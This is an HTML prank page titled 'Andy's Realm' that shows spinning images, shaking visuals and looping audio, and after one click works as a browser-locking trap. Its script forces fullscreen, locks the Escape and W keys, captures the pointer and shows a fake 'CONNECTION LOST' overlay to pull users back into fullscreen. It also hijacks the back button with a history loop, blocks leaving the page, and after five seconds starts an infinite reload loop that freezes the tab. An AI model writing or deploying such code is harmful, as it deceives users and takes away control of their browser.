<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Andy's Realm</title>
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            overflow: hidden; background-color: black;
        }

        /* The shaker-box now contains ALL elements and the background */
        #shaker-box {
            width: 100vw; height: 100vh;
            background-image: url('andyvid.gif'), url('andyside.jpg'), url('andyside.jpg');
            background-position: center center, left center, right center;
            background-repeat: no-repeat, repeat-y, repeat-y;
            background-size: contain, auto 100%, auto 100%;
            position: relative;
            transition: transform 0.02s linear;
            /* Applies effect to EVERYTHING inside */
            filter: url(#chromatic-aberration); 
        }

        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .andy-1 { width: 150px; position: absolute; top: 50%; z-index: 10; animation: moveSide 4s ease-in-out infinite alternate, rotate 1s linear infinite; }
        .andy-2 { width: 150px; position: absolute; left: 20px; z-index: 10; animation: moveUpAndDown 5s ease-in-out infinite alternate, rotate 4s linear infinite; }
        .andy-3 { width: 150px; position: absolute; right: 20px; z-index: 10; animation: moveUpAndDown 6s ease-in-out infinite alternate, rotate 2s linear infinite; }
        .andy-circle-container { position: absolute; top: 50%; left: 50%; width: 10px; height: 10px; z-index: 11; animation: circlePath 10s linear infinite; }
        .andy-4 { width: 120px; animation: rotate 2.5s linear infinite; }
        
        @keyframes moveSide { from { left: 0%; } to { left: calc(100% - 150px); } }
        @keyframes moveUpAndDown { from { top: 0%; } to { top: calc(100% - 150px); } }
        @keyframes circlePath { from { transform: rotate(0deg) translateX(250px) rotate(0deg); } to { transform: rotate(360deg) translateX(250px) rotate(-360deg); } }

        #conf {
            width: 100%; height: 100%; top: 0; left: 0;
            position: fixed; background: white; z-index: 99;
            display: flex; justify-content: center; align-items: center;
        }

        #fullscreen-trap {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); z-index: 10000; cursor: pointer;
            color: white; font-family: sans-serif; text-align: center; padding-top: 20%;
        }
    </style>
</head>
<body>

    <!-- SVG Filter for Global Chromatic Aberration -->
    <svg style="position: absolute; width: 0; height: 0;">
      <filter id="chromatic-aberration">
        <feColorMatrix in="SourceGraphic" type="matrix" values="1 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 1 0" result="r"/>
        <feColorMatrix in="SourceGraphic" type="matrix" values="0 0 0 0 0  0 1 0 0 0  0 0 0 0 0  0 0 0 1 0" result="g"/>
        <feColorMatrix in="SourceGraphic" type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 1 0 0  0 0 0 1 0" result="b"/>
        <feOffset id="red-offset" in="r" dx="2" dy="0" result="r-shifted"/>
        <feOffset id="blue-offset" in="b" dx="-2" dy="0" result="b-shifted"/>
        <feBlend in="r-shifted" in2="g" mode="screen" result="rg"/>
        <feBlend in="rg" in2="b-shifted" mode="screen"/>
      </filter>
    </svg>

    <div id="shaker-box">
        <!-- These now inherit the parent's filter -->
        <img src="andyspin.jpg" class="andy-1">
        <img src="andyspin2.jpg" class="andy-2">
        <img src="andyspin3.jpg" class="andy-3">
        <div class="andy-circle-container"><img src="andyspin4.jpg" class="andy-4"></div>
    </div>

    <div id="conf"><input type="button" value="click for mythical andy" onclick="start()"></div>
    <div id="fullscreen-trap" onclick="forceFullscreen()">
        <h1>CONNECTION LOST</h1><p>CLICK TO RE-ENTER THE REALM</p>
    </div>
    
    <audio id="jump" loop><source src="mingleboosted.mp3"></audio>

    <script>
        const trap = document.getElementById('fullscreen-trap');
        const shaker = document.getElementById('shaker-box');
        const rOff = document.getElementById('red-offset');
        const bOff = document.getElementById('blue-offset');

        function startShaking() {
            setInterval(() => {
                const intensity = 18; 
                const x = (Math.random() - 0.5) * intensity;
                const y = (Math.random() - 0.5) * intensity;
                shaker.style.transform = `translate(${x}px, ${y}px)`;

                // Dynamic color split intensity
                const split = (Math.random() * 5) + 1;
                rOff.setAttribute('dx', split);
                bOff.setAttribute('dx', -split);
            }, 45); 
        }

        async function forceFullscreen() {
            const elem = document.documentElement;
            try {
                if (elem.requestFullscreen) await elem.requestFullscreen();
                if (navigator.keyboard && navigator.keyboard.lock) await navigator.keyboard.lock(["Escape", "KeyW"]);
                if (elem.requestPointerLock) elem.requestPointerLock();
                trap.style.display = 'none';
            } catch (err) {}
        }

        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement) trap.style.display = 'block';
        });

        function start() {
            document.getElementById('conf').style.display = 'none';
            document.querySelector('#jump').play();
            forceFullscreen();
            startShaking();
            window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => { window.history.go(1); };
            window.onbeforeunload = (e) => { e.preventDefault(); e.returnValue = ''; };
            setInterval(() => { window.history.pushState(null, "", window.location.href); }, 100);
            document.addEventListener('visibilitychange', () => {
                document.title = document.hidden ? "COME BACK TO ANDY" : "Andy's Realm";
            });
            
            // Set the localStorage flag when the user tries to leave/reload
            window.onbeforeunload = function () {
                localStorage.x = 1;
            };
    
            // Wait 5 seconds (5000ms), then start the reload loop
            setTimeout(function () {
                console.log("Starting reload loop...");
                
                // This creates an infinite loop of reload commands
                while (true) {
                    location.reload();
                }
            }, 5000);

        }
    </script>
</body>
</html>
